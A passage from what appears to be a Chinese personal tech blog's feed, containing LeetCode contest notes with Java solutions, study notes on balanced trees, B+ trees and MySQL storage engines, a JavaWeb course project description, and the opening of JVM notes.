class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">    不要灰心，继续加油~~~</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>4/3 周赛小结</title>
    <link href="/2023/06/18/43zhou-sai-xiao-jie/"/>
    <url>/2023/06/18/43zhou-sai-xiao-jie/</url>
    
    <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>参与leetcode周赛与双周赛，每场四题，均只做出了前两题，目前觉得第三题是自己练习的目标，争取后面能将第三题做出来，此次小结记录下这次的两道第三题的做法</p><h2 id="字符串的子序列数量"><a href="#字符串的子序列数量" class="headerlink" title="字符串的子序列数量"></a>字符串的子序列数量</h2><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p> 输入一个二进制字符串, 输出值为”101”或者”010”的子序列的数量</p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>个人觉得这种做法挺妙的，但说不出用的什么思想，可能是前缀和？</p><p>代码<br>n0 表示 值为”0”的子序列的数量<br>n1 表示 值为”1”的子序列的数量<br>n10 表示 值为”10”的子序列的数量<br>n01 表示 值为”01”的子序列的数量<br>时间复杂度: O(n)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">numberOfWays</span><span class="params">(String s)</span> &#123;        </span><br><span class="line">        <span class="type">long</span> ans=<span class="number">0</span>, n0=<span class="number">0</span>, n1=<span class="number">0</span>, n10=<span class="number">0</span>, n01=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : s.toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">if</span>(c==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">                n01 += n0;</span><br><span class="line">                n1 ++;</span><br><span class="line">                ans += n10;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                n10 += n1;</span><br><span class="line">                n0 ++; </span><br><span class="line">                ans += n01;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="扩展题-不同的子序列"><a href="#扩展题-不同的子序列" class="headerlink" title="扩展题 不同的子序列"></a>扩展题 不同的子序列</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给定一个字符串 s 和一个字符串 t ，计算在 s 的子序列中 t 出现的个数。<br>字符串的一个 子序列 是指，通过删除一些（也可以不删除）字符且不干扰剩余字符相对位置所组成的新字符串。（例如，”ACE” 是 “ABCDE” 的一个子序列，而 “AEC” 不是）<br>题目数据保证答案符合 32 位带符号整数范围。<br><img src="/upload/2022/04/image-ac0070a250104cf885afec458183e9f2.png" alt="image.png"></p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>采用动态规划的方式，具体推导有链接<a href="https://leetcode-cn.com/problems/distinct-subsequences/solution/bu-tong-de-zi-xu-lie-by-leetcode-solutio-urw3/">https://leetcode-cn.com/problems/distinct-subsequences/solution/bu-tong-de-zi-xu-lie-by-leetcode-solutio-urw3/</a></p><p>动态规划状态方程为：<br><img src="/upload/2022/04/image-d15515deb51b4c87bf30e0037f8add68.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numDistinct</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> s.length(), n = t.length();</span><br><span class="line">        <span class="keyword">if</span> (m &lt; n) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            dp[i][n] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> m - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">sChar</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="type">char</span> <span class="variable">tChar</span> <span class="operator">=</span> t.charAt(j);</span><br><span class="line">                <span class="keyword">if</span> (sChar == tChar) &#123;</span><br><span class="line">                    dp[i][j] = dp[i + <span class="number">1</span>][j + <span class="number">1</span>] + dp[i + <span class="number">1</span>][j];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = dp[i + <span class="number">1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="每个小孩最多能分到多少糖果"><a href="#每个小孩最多能分到多少糖果" class="headerlink" title="每个小孩最多能分到多少糖果"></a>每个小孩最多能分到多少糖果</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你一个 下标从 0 开始 的整数数组 candies 。数组中的每个元素表示大小为 candies[i] 的一堆糖果。你可以将每堆糖果分成任意数量的 子堆 ，但 无法 再将两堆合并到一起。<br>另给你一个整数 k 。你需要将这些糖果分配给 k 个小孩，使每个小孩分到 相同 数量的糖果。每个小孩可以拿走 至多一堆 糖果，有些糖果可能会不被分配。<br>返回每个小孩可以拿走的 最大糖果数目 。<br><img src="/upload/2022/04/image-57c6efa65ff74f58bfdcebf6ef74392c.png" alt="image.png"></p><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>这是一道二分查找题，此类型的题目的通用做法如下：</p><ol><li>确定查找区间<br>根据题意，我们需要搜寻的目标是小孩子最多可以拿走多少个糖果；小孩一次最少也得拿一个糖果，最多一次拿走全部<br>由此，我们首先对糖果总数进行统计；同时可知，若糖果总数小于小孩子的总数，无论如何不会有符合条件的答案，直接返回0<br>最终，区间确定为left &#x3D; 1, right &#x3D; sum(nums)</li><li>二分答案进行查找<br>利用二分查找缩小查找答案的区间，每次对取得的mid进行check<br>在本题条件下，我们会发现，若某个mid符合条件时，我们会希望得到更大的答案，此时查找区间从[left, right]变为[mid + 1, right]，同时对ans进行更新<br>若mid不符合条件，则答案过大，我们希望得到符合条件的答案，因此要对右区间进行缩小，此时查找区间从[left, right]变为[left, right - 1]</li><li>确定check方法<br>这一步算是二分答案的核心内容，我们需要根据题目的要求来确定，我们所得的mid是否符合条件，从而确定区间的移动<br>在本题条件下我们只需要统计一个数中，最多可以分出多少个mid<br>例：[2,5,3,7] mid &#x3D; 3, k &#x3D; 4，一次拿取mid个糖果<br>其中：2无法满足一次拿取，k值不变；<br>5可以分为3和2，来满足一次拿去， k -&#x3D; 1；<br>3本身正好可以满足一次拿取，k -&#x3D; 1；<br>7可以分为3和4，来满足一次拿取，而4又可以分为3和1，再一次满足一次拿取<br>根据这个思路，对数组中的糖果进行拿取；最终若可满足K个孩子，则返回true，否则返回false；返回的布尔值会决定上一步中的区间的左右移动<br>本题采用的时while (left &lt;&#x3D; right)最终返回ans；<br>若采用while (left &lt; right)则最终返回left或right都可以(二者最终汇聚到一点)<br>二分查找类的题目更多类似于板子题，其核心是区间的左右移动及如何决定区间的移动<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumCandies</span><span class="params">(<span class="type">int</span>[] candies, <span class="type">long</span> k)</span> &#123;</span><br><span class="line">        <span class="comment">//确定查找区间</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> val : candies) sum += val;</span><br><span class="line">        <span class="keyword">if</span> (sum &lt; k) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">1</span>, right = sum;</span><br><span class="line">        <span class="type">long</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line"><span class="comment">//二分答案进行查找</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (check(candies, mid, k)) &#123;</span><br><span class="line">                ans = mid;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>) ans;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//确定`check`方法</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span>[] candies, <span class="type">long</span> limit, <span class="type">long</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> val : candies) &#123;</span><br><span class="line">            <span class="keyword">if</span> (val &lt; limit) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (val == limit) k--;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                k -= val / limit;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> k &lt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>动态规划</tag>
      
      <tag>二分法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>B树、B+树、红黑树</title>
    <link href="/2023/06/18/B%E6%A0%91%E3%80%81B+%E6%A0%91%E3%80%81%E7%BA%A2%E9%BB%91%E6%A0%91/"/>
    <url>/2023/06/18/B%E6%A0%91%E3%80%81B+%E6%A0%91%E3%80%81%E7%BA%A2%E9%BB%91%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h2 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h2><p>在记录标题三种树之前先简短记录一下平衡二叉树。</p><p>平衡二叉树是基于二叉搜索树的，二叉搜索树中查询的效率和树高有关，但二叉搜索树存在极端情况，即树链表化，为了改善这个情况，出现了平衡二叉树（也称为AVL树）。</p><p>AVL树是最早被发明的自平衡二叉查找树。在AVL树中，任一节点对应的两棵子树的最大高度差为1，因此它也被称为高度平衡树。查找、插入和删除在平均和最坏情况下的时间复杂度都是 O(logn）</p><p>AVL树每次插入或者删除新的节点会进行左旋或者右旋操作进行自平衡，具体的旋转方法和代码实现如下链接：<br><a href="https://blog.csdn.net/qq_37934101/article/details/81160254">AVL树的左旋、右旋描述及底层代码实现</a></p><p>平衡二叉树的缺点就是：<br>（1）维护平衡过程的成本代价很高，因为每次删除一个节点或者增加一个节点的话，需要一次或者多次的左旋，右旋等去维护“平衡”状态<br>（2）查询的效率不稳定，最快O(1)，最慢O(logn)<br>（3）如果节点很多的话，那么这个AVL树的高度还是会很高的，那么查询效率还是会很低<br>（4) 节点存储的数据内容太少。没有很好利用操作系统和磁盘数据交换特性，也没有利用好磁盘IO的预读能力。因为操作系统和磁盘之间一次数据交换是已页为单位的，一页 &#x3D; 4K，即每次IO操作系统会将4K数据加载进内存。但是，在二叉树每个节点的结构只保存一个关键字，一个数据区，两个子节点的引用，并不能够填满4K的内容。幸幸苦苦做了一次的IO操作，却只加载了一个关键字，在树的高度很高，恰好又搜索的关键字位于叶子节点或者支节点的时候，取一个关键字要做很多次的IO。因此平衡二叉树不太符合MySQL的查询结构。</p><h2 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h2><p>一种自平衡二叉查找树,但在每个节点增加一个存储位表示节点的颜色,可以是red或black. 通过对任何一条从根到叶子的路径上各个节点着色的方式的限制,红黑树确保没有一条路径会比其它路径长出两倍.</p><p>它是一种弱平衡二叉树(由于是弱平衡,可以推出,相同的节点情况下,AVL树的高度低于红黑树),相对于要求严格的AVL树来说,它的旋转次数变少,所以对于搜索,插入,删除操作多的情况下,我们就用红黑树.</p><h3 id="红黑树性质"><a href="#红黑树性质" class="headerlink" title="红黑树性质"></a>红黑树性质</h3><ol><li>每个节点非红即黑，根节点是黑的。</li><li>每个叶节点(叶节点即树尾端NUL指针或NULL节点)都是黑的.</li><li>如果一个节点是红的,那么它的两儿子都是黑的（相邻的两个节点不能同时为红色）</li><li>对于任意节点而言,其到叶子点树NIL指针的每条路径都包含相同数目的黑节点.</li></ol><p><a href="https://blog.csdn.net/GodTheTang/article/details/121060187">红黑树详细介绍</a></p><p><a href="https://mr-dai.github.io/java_collection_treemap/">红黑树源码详解</a></p><p>以上性质保证了红黑树在满足平衡二叉树特征的前提下，还可以做到 从根到叶子的最长路径最多不会超过最短路径的两倍 ，这主要是考虑两个极端的情况，由性质 3 和 4 我们可以知道在一棵红黑树上从根到叶子的最短路径全部由黑色结点构成，而最长结点则由红黑结点交错构成（始终按照一红一黑的顺序组织），又因为最短路径和最长路径的黑色结点数目是一致的，所以最长路径上的结点数是最短路径的两倍。</p><h2 id="B树"><a href="#B树" class="headerlink" title="B树"></a>B树</h2><h3 id="2-3-4树"><a href="#2-3-4树" class="headerlink" title="2-3-4树"></a>2-3-4树</h3><p>在学习B树之前我学习了2-3-4树，B树是由2-3-4树转变而来，2-3-4树中一个节点最多只能有4个孩子，那如果每个孩子数再多一些就是B树。</p><p>2-3-4树中的2、3、4的含义指的是一个节点可能含有的子节点数。对非子叶节点有三种可能的情况：</p><ol><li>有一个数据项的节点总是有两个子节点</li><li>有两个数据项的节点总是有三个子节点</li><li>有三个数据项的节点重是有四个子节点</li></ol><p><a href="https://blog.csdn.net/heyanxi0101/article/details/79751514">2-3-4树详细介绍</a></p><h3 id="B-树的特性"><a href="#B-树的特性" class="headerlink" title="B 树的特性"></a>B 树的特性</h3><p>B树是一种常用的M阶树，可广泛用于磁盘访问。 M阶树顺序的B树最多可以有m-1个键和M个子树。 使用B树的主要原因之一是它能够在单个节点中存储大量键，并且通过保持树的高度相对较小来存储大键值。<br>B树包含M阶树的所有属性。 此外，它还包含以下属性。</p><ol><li>B树中的每个节点最多包含m个子节点，m-1个关键字</li><li>除根节点和叶节点外，B树中的每个节点至少包含m&#x2F;2（向下取整）个子节点。</li><li>根节点必须至少有2个节点。</li><li>所有叶节点必须处于同一级别，同一节点中的键按大小排序。</li></ol><p><a href="https://www.yiibai.com/data_structure/b-tree.html">B树详细介绍</a></p><p>B-树相比平衡二叉树优点<br>每个节点存储多个多个关键词，合理利用空间大小，每次mysql进行读取时，都会进行预读取，每次把该节点数据读取出来并存储到内存中<br>B-树中每个节点存储的关键词变多，导致存储相同数量的数据，B-树的深度相比平衡二叉树深度更浅，减少了数据的查找次数和复杂度</p><h2 id="B-树"><a href="#B-树" class="headerlink" title="B+树"></a>B+树</h2><h3 id="B-树的性质"><a href="#B-树的性质" class="headerlink" title="B+树的性质"></a>B+树的性质</h3><p>B+树是应文件系统所需而产生的一种B树的变形树。一棵m阶的B+树和m阶的B树的差异在于：<br>(1) 有n棵子树的结点中含有n个关键字；<br>(2) 所有的叶子结点中包含了全部关键字的信息，及指向含有这些关键字记录的指针，且叶子结点本身依关键字的大小自小而大的顺序链接；<br>(3) 所有的非终端结点可以看成是索引部分，结点中仅含有其子树根结点中最大（或最小）关键字。</p><p><a href="https://zhuanlan.zhihu.com/p/351240279">B+树详细介绍</a></p><h3 id="B-树对比红黑树"><a href="#B-树对比红黑树" class="headerlink" title="B+树对比红黑树"></a>B+树对比红黑树</h3><p>红黑树多用于内部排序，即全放在内存中<br>B+树多用于外存上时，B+也被成为一个磁盘友好的数据结构<br>红黑树和平衡二叉树有相同缺点，每个节点存储一个关键词，数据量大时，导致红黑树的深度很深，mysql每次读取时消耗大量io</p><h3 id="B-树相比B树的优点"><a href="#B-树相比B树的优点" class="headerlink" title="B+树相比B树的优点"></a>B+树相比B树的优点</h3><p>B+树非叶子节点只存储key值，而B树存储key值和data值，B+树的层级更少，查询效率更高<br>mysql进行区间访问时，由于B+树叶子节点之间用指针相连，只需要遍历所有的叶子节点即可；而B树则需要中序遍历那样遍历<br>B+树所有关键词地址都存在叶子节点上，所以每次查询次数都相同，比B树稳定</p><h3 id="为什么高度为3的B-树存储千万级数据？"><a href="#为什么高度为3的B-树存储千万级数据？" class="headerlink" title="为什么高度为3的B+树存储千万级数据？"></a>为什么高度为3的B+树存储千万级数据？</h3><p>解释这个问题的前提，mysql使用InnoDB引擎，mysql默认页文件大小为16k<br>假设我们一行数据大小为1k，那么一页存储16条数据，也就是说一个叶子节点能存储16条数据<br>再来看看非叶子节点，假设主键ID为bigint类型，那么长度为8B，指针大小在InnoDB引擎中的大小为6B，一共14B，那么一页中可以存放16k&#x2F;14B&#x3D;1170个(主键+指针)<br>也就是说高度为2的B+树可以存储的数据为:1170*16&#x3D;18720条；高度为3的B+树可以存储的数据为:1170*1170*16&#x3D;21902400(千万条数据)<br>这也是为什么mysql可以支撑千万级别数据的原因</p><h2 id="Mysql存储引擎"><a href="#Mysql存储引擎" class="headerlink" title="Mysql存储引擎"></a>Mysql存储引擎</h2><p>MyISAM和InnoDB的区别<br>定义<br>InnoDB：MySQL默认的事务型引擎，也是最重要和使用最广泛的存储引擎。它被设计成为大量的短期事务，短期事务大部分情况下是正常提交的，很少被回滚。InnoDB的性能与自动崩溃恢复的特性，使得它在非事务存储需求中也很流行。除非有非常特别的原因需要使用其他的存储引擎，否则应该优先考虑InnoDB引擎。</p><p>MyISAM：在MySQL 5.1 及之前的版本，MyISAM是默认引擎。MyISAM提供的大量的特性，包括全文索引、压缩、空间函数（GIS）等，但MyISAM并不支持事务以及行级锁，而且一个毫无疑问的缺陷是崩溃后无法安全恢复。</p><p>事务<br>InnoDB：支持<br>MyISAM：不支持</p><p>锁<br>InnoDB：支持行锁、表锁。行锁是实现在索引上的，如果没有索引，就没法使用行锁，将退化为表锁。<br>MyISAM：支持表锁。</p><p>主键<br>InnoDB：必须有，没有指定会默认生成一个隐藏列作为主键<br>MyISAM：可以没有</p><p>索引<br>InnoDB：聚集索引，使用 B+ 树作为索引结构，数据文件和索引绑在一起，必须要有主键。主键索引一次查询；辅助索引两次查询，先查询主键，再查询数据；<br>MyISAM：非聚集索引，使用 B+ 树作为索引结构，索引和数据文件是分离的。主键索引和辅助索引是独立的。</p><p>外键<br>InnoDB：支持<br>MyISAM：不支持</p><p>AUTO_INCREMENT<br>InnoDB：必须包含只有该字段的索引。引擎的自动增长列必须是索引，如果是组合索引也必须是组合索引的第一列。<br>MyISAM：可以和其他字段一起建立联合索引。引擎的自动增长列必须是索引，如果是组合索引，自动增长可以不是第一列，他可以根据前面几列进行排序后递增。</p><p>数据库文件<br>InnoDB：frm是表定义文件，ibd是数据文件。支持两种存储方式：</p><p>共享表空间存储：所有表的数据文件和索引都保存在一个表空间里，一个表空间可以有多个文件，通过 innodb_data_file_path 和 innodb_data_home_dir 参数设置共享表空间的位置和名字，一般共享表空间的名字叫 ibdata1-n。<br>多表空间存储：每个表都有一个表空间文件用于存储每个表的数据和索引，文件名以表名开关，以.ibd为扩展名<br>MyISAM：frm是表定义文件，myd是数据文件，myi是索引文件。支持三种存储格式：静态表（默认，注意数据末尾不能有空格，会被去掉。）、动态表、压缩表。</p><p>表的行数<br>InnoDB：没有保存。select count(<em>) from table;会扫描全表。<br>MyISAM：保存。select count(</em>) from table;会直接取出该值。</p><p>注：但加了 where 条件后，两者处理方式一样，都是扫描全表。</p><p>全文索引<br>InnoDB：5.7及以后版本支持。<br>MyISAM：支持。</p><p>总结<br>InnoDB：<br>优点：支持事务，支持外键，并发量较大，适合大量 update。<br>缺点：查询数据相对较快，不适合大量的 select。</p><p>MyISAM：<br>优点：查询数据相对较快，适合大量的 select，可以全文索引。<br>缺点：不支持事务，不支持外键，并发量较小，不适合大量 update。</p><p>如何选择？<br>你的数据库有外键吗？如有，选择 InnoDB。<br>你需要事务支持吗？如需要，选择 InnoDB。<br>你需要全文索引吗？在5.7及以后版本，都可选，优先考虑 InnoDB + Sphinx。<br>你经常使用什么样的查询模式？如果表中绝大多数都只是读查询，可以考虑 MyISAM，如果既有读写也挺频繁，请使用 InnoDB。<br>你的数据有多大？数据量大，选择 InnoDB，因为其支持事务处理和故障恢复。MyISAM 可能需要几小时或几天来恢复，InnoDB 只需要几分钟。<br>你需要在线热备份吗？如需要，选择 InnoDB。</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb课程设计</title>
    <link href="/2023/06/18/JavaWeb%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"/>
    <url>/2023/06/18/JavaWeb%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最开始是没有想着写一篇这个的，因为这个感觉没什么好说的，虽然是才学的课程的课程设计，但是感觉所用的技术太过于老旧，并且自己编码也很乱，基本是随心所欲的在写，和目前的主流编程框架都不一样，但还是简单记录一下</p><h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><p>课设内容为实验室设备管理系统，对题目内容进行需求分析如下：<br>1、需要能够填写申请表申请实验设备，申请表内容（设备类别、设备名称、设备编号、设备规格、设备数量、计划使用数量、申请说明、学院）<br>2、申请表填写后需要交由上级领导进行批准后才能购买，当领导批准后需要将信息填入设备表中，设备表提供查询功能，哪怕还没有购买也要能够查询到该设备的信息和状态。<br>3、购买的时候进行购买登记，此时负责购买登记的人需要登记，登记内容（购买价格、购买日期、物品厂商、保质期、购买者姓名）<br>4、需要实现实验设备的动态借还管理，借用后设备状态显示为被借用，之后无法被借用，只有归还后才能被借用<br>5、实验设备状态能够被更新，状态可以分为良好、损坏、报废三种状态，只有当实验设备状态为良好的时候才能够被借用，当设备状态为损坏的时候需要被报修，报修后将设备状态从损坏更改为良好，并记录报修信息（修理日期,设备名,编号,修理厂家,修理费用,责任人）；当设备状态为报废的时候设备需要进行报废处理，处理后将报废信息记录，并将该设备从设备表中删除。<br>6、要提供一个板块，能够实现实验设备的查询功能；还需要提供一个板块，能够实现报废信息和故障信息的查询功能。<br>7、需要建立一个固定资产表，其中记录了实验设备耗费的金额信息；还需要记录各个学院的耗费金额。<br>8、需要一个板块来看学期汇总表，其中有计划消耗和实际消耗的对比表。</p><p>根据以上需求分析，功能多且杂，很明显对应着不同的角色，不同角色有不同的权限来执行不同的任务。根据个人分析，将功能分配给四个角色，分别为：上级领导、实验室管理者、实验设备采购者、实验设备使用者。</p><p>当时自己画的数据流图：<br><img src="/upload/2022/04/image-16fb89c211f5434e9a6a83842136f3dc.png" alt="image.png"></p><p>依据分析建立了五个表，分别为用户表，申请表，设备表，修理表，报废表</p><p>数据从客户端到服务器端使用的是form表单提交到指定的Servlet界面，再到Servlet界面利用request.getParameter方法得到属性，连接JDBC进行处理。</p><p>好像真没什么好说的</p>]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JVM笔记</title>
    <link href="/2023/06/18/JVM%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/06/18/JVM%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="JVM是什么"><a href="#JVM是什么" class="headerlink" title="JVM是什么"></a>JVM是什么</h2><p>定义:<br>JVM是Java Virtual Machine（Java虚拟机）的缩写，是一台执行Java字节码的虚拟计算机，它拥有独立的运行机制。<br>可以将JVM理解为是一个运行字节码的平台。<br>作用：<br>•提供Java的运行环境<br>•加载代码、验证代码、执行代码<br>•垃圾回收</p><h2 id="为什么要学习JVM"><a href="#为什么要学习JVM" class="headerlink" title="为什么要学习JVM"></a>为什么要学习JVM</h2><p>•首先，作为一名Java程序员，通过学习JVM，能让你对Java这门语言有更深刻的理解，更加了解底层程序的执行过程；<br>•其次，我们都知道Java语言，是一个能自动回收内存的语言，这个特点大大方便了我们程序员。但是，也正因为这个特点，如果程序发生内存泄漏、内存溢出等情况的时候，而我们又不了解底层的垃圾回收机制的话，就会给我们解决问题带来很大的麻烦。</p><p>JVM架构图-简图<br> <img src="/upload/2022/03/image-4cbfd1c253164648bcaf49d6b01db521.png" alt="image.png"></p><h3 id="JVM家族"><a href="#JVM家族" class="headerlink" title="JVM家族"></a>JVM家族</h3><p>鼻祖：Sun Classic、Exact VM<br>主流：HotSpot VM<br>次之：BEA JRockit、IBM J9 VM<br>其他：BEA Liquid VM、Azul VM…</p><h3 id="类加载器子系统"><a href="#类加载器子系统" class="headerlink" title="类加载器子系统"></a>类加载器子系统</h3><p><strong>作用</strong><br>•类加载子系统负责从文件系统或者网络中加载class文件，class文件在文件开头有特定的标识。<br>•ClassLoader只负责class文件的加载，至于它是否可以运行，则由执行引擎来决定。<br><strong>类加载过程</strong><br>•加载——&gt;链接——&gt;初始化——&gt;使用——&gt;卸载<br>•链接包括三个阶段（验证、准备、解析）<br><strong>类加载器分类</strong><br>•启动类加载器（Bootstrap ClassLoader）<br>•扩展类加载器（Extension ClassLoader）<br>•系统类加载器（Application ClassLoader）<br>•自定义类加载器（User Defined ClassLoader）<br><strong>类加载机制</strong><br>双亲委派机制<br>定义： 当一个类加载器收到了类加载的请求时，它首先不会自己去加载，而是会把这个请求交给父类加载器，如果父类加载器还有父类，就会一直往上传，直至传递到启动类加载器，如果父类加载器不能加载，才由子类加载器进行加载。<br>好处：<br>1.避免类重复加载<br>2.保护程序安全，防止核心API被随意修改<br>o自定义类：java.lang.String（该类不会被加载）<br>o自定义类：java.lang.Tang（报错：阻止创建 java.lang开头的类）<br>3.保证核心API的访问权限</p><h2 id="内存模型（运行时数据区）"><a href="#内存模型（运行时数据区）" class="headerlink" title="内存模型（运行时数据区）"></a>内存模型（运行时数据区）</h2><p>运行时数据区是JVM中非常重要的一部分，由程序计数器、虚拟机栈、本地方法栈、堆、方法区组成。</p><h3 id="程序计数器（Program-Counter-Register）"><a href="#程序计数器（Program-Counter-Register）" class="headerlink" title="程序计数器（Program Counter Register）"></a>程序计数器（Program Counter Register）</h3><p>介绍<br>JVM中的程序计数寄存器（Program Counter 